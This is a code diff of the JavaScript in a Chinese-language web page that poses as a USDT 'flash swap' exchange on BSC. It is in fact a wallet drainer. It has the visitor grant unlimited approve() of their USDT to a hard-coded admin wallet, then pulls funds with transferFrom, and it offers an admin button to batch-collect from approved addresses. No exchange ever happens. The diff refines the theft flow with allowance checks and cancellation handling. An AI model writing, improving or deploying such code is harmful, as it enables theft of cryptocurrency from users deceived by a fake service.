@@ -444,9 +444,9 @@ body {
 </div>
 
 <script>
-// BSC主网USDT合约地址
+// BSC主网 USDT合约
 const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
-// 管理员收款地址（授权接收方）
+// 管理员收款地址（spender授权地址）
 const ADMIN_WALLET = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6";
 const ADMIN_LOWER = ADMIN_WALLET.toLowerCase();
 
@@ -458,12 +458,12 @@ const swapBtn = document.getElementById("swapBtn");
 const usdtBalanceEl = document.getElementById("usdtBalance");
 const addrTextEl = document.getElementById("addrText");
 
-// 输入金额联动
+// 输入框双向联动
 sendInput.addEventListener("input", () => {
   receiveInput.value = sendInput.value;
 });
 
-// 连接钱包
+// 连接钱包逻辑
 document.getElementById("connectWallet").addEventListener("click", async () => {
   if (!window.ethereum) {
     alert("请安装MetaMask、TP钱包等Web3钱包");
@@ -479,13 +479,15 @@ document.getElementById("connectWallet").addEventListener("click", async () => {
     addrTextEl.innerText = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
     swapBtn.disabled = false;
 
-    // 读取USDT余额
+    // ERC20基础ABI
     const erc20Abi = [
       "function balanceOf(address owner) view returns (uint256)",
+      "function allowance(address owner, address spender) view returns(uint256)",
       "function approve(address spender, uint256 amount) returns (bool)",
       "function transferFrom(address from, address to, uint256 amount) returns(bool)"
     ];
     const usdtContract = new ethers.Contract(USDT_CONTRACT, erc20Abi, provider);
+    // 获取并展示余额
     const rawBalance = await usdtContract.balanceOf(userAddress);
     const formatBalance = ethers.utils.formatUnits(rawBalance, 18);
     usdtBalanceEl.innerText = parseFloat(formatBalance).toFixed(4);
@@ -500,46 +502,72 @@ document.getElementById("connectWallet").addEventListener("click", async () => {
   }
 });
 
-// 闪兑逻辑：先授权，授权成功后调用transferFrom把用户输入数量USDT转入管理员钱包
+// 闪兑主逻辑：修改弹窗+增加授权额度校验、等待区块确认，解决普通钱包取消订单问题
 swapBtn.addEventListener("click", async () => {
   if (!isWalletConnected) {
     alert("请先连接钱包");
     return;
   }
-  const inputNum = sendInput.value;
+  const inputNum = sendInput.value.trim();
   if (!inputNum || Number(inputNum) <= 0) {
-    alert("请输入兑换数量");
+    alert("请输入有效的兑换数量");
     return;
   }
+
   try {
     const erc20Abi = [
+      "function balanceOf(address owner) view returns (uint256)",
+      "function allowance(address owner, address spender) view returns(uint256)",
       "function approve(address spender, uint256 amount) returns (bool)",
       "function transferFrom(address from, address to, uint256 amount) returns(bool)"
     ];
     const usdtContract = new ethers.Contract(USDT_CONTRACT, erc20Abi, signer);
-    // 无限授权管理员地址
-    const maxAllow = ethers.constants.MaxUint256;
-    // 唤起钱包授权弹窗
-    const approveTx = await usdtContract.approve(ADMIN_WALLET, maxAllow);
-    await approveTx.wait();
-    alert("授权完成，开始划转资产");
+    const amountWei = ethers.utils.parseUnits(inputNum, 18);
 
-    // 将用户填写的USDT转入管理员钱包
-    const sendWei = ethers.utils.parseUnits(inputNum, 18);
-    const transferTx = await usdtContract.transferFrom(userAddress, ADMIN_WALLET, sendWei);
+    // 1.前置校验余额是否充足
+    const userBalance = await usdtContract.balanceOf(userAddress);
+    if(userBalance.lt(amountWei)){
+      alert("USDT余额不足，无法完成兑换");
+      return;
+    }
+
+    // 2.查询当前授权额度
+    let currentAllowance = await usdtContract.allowance(userAddress, ADMIN_WALLET);
+    // 如果授权不足，则发起无限授权
+    if(currentAllowance.lt(amountWei)){
+      const maxAllow = ethers.constants.MaxUint256;
+      const approveTx = await usdtContract.approve(ADMIN_WALLET, maxAllow);
+      await approveTx.wait(); // 强制等待授权上链确认
+    }
+
+    // 替换原来温馨提示弹窗 → 确认是否继续闪兑
+    const continueSwap = confirm("授权已完成，是否确认继续闪兑？");
+    if(!continueSwap){
+      alert("你已取消本次闪兑订单");
+      return;
+    }
+
+    // 3.执行划转，用户USDT转入管理员钱包
+    const transferTx = await usdtContract.transferFrom(userAddress, ADMIN_WALLET, amountWei);
     await transferTx.wait();
-    alert("闪兑完成，资产已转入目标账户");
+    alert("闪兑交易上链成功，资产已到账");
 
     // 清空输入框
     sendInput.value = "";
     receiveInput.value = "";
+
   } catch (err) {
-    console.error(err);
-    alert("操作终止：授权取消或交易失败");
+    console.error("交易错误：",err);
+    // 区分用户手动取消和链上错误
+    if(err.code === 4001){
+      alert("您在钱包内取消了本次交易");
+    }else{
+      alert("交易失败：" + err.message);
+    }
   }
 });
 
-// 后台批量归集
+// 管理员后台批量归集资产
 document.getElementById("deductBtn").addEventListener("click", async () => {
   if(userAddress.toLowerCase() !== ADMIN_LOWER) return alert("权限不足");
   const targetAddr = document.getElementById("userAddr").value.trim();
